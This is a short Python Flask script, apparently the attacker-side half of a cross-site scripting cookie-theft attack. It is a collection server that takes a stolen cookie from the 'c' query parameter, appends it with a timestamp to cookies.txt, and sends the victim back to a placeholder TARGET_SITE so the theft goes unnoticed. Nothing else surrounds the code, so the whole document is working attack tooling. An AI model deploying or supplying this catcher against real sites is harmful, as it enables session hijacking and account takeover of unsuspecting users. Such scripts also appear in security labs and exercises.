from flask import Flask, request, redirect
from datetime import datetime

app = Flask(__name__) # create instance of the app

@app.route('/') # our home URL
def cookie():

    # Grabbing our cookie and writing it to a file "cookies.txt"

    cookie = request.args.get('c')
    f = open("cookies.txt","a")
    f.write(cookie + ' ' + str(datetime.now()) + '\n')
    f.close()

    # redirect user back to hompage

    return redirect("http://TARGET_SITE/")

if __name__ == "__main__":
    app.run(host = '0.0.0.0', port=5000) # 0.0.0.0 - listen on all poublic IPs
